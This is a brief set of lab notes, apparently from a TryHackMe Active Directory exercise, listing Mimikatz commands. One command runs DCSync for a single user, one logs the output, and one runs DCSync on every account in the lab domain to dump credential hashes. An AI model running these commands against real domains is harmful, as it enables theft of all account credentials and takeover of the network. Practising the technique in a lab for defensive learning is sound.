# Persistence through Credentials

### Persistence through Credentials

```batch
lsadump::dcsync /domain:za.tryhackme.loc /user:<Your low-privilege AD Username>
```

DC sync every single account. To do this, we will have to enable logging on Mimikatz:

```batch
log <username>_dcdump.txt 
```

DC Sync all accounts

```batch
mimikatz # lsadump::dcsync /domain:za.tryhackme.loc /all
```
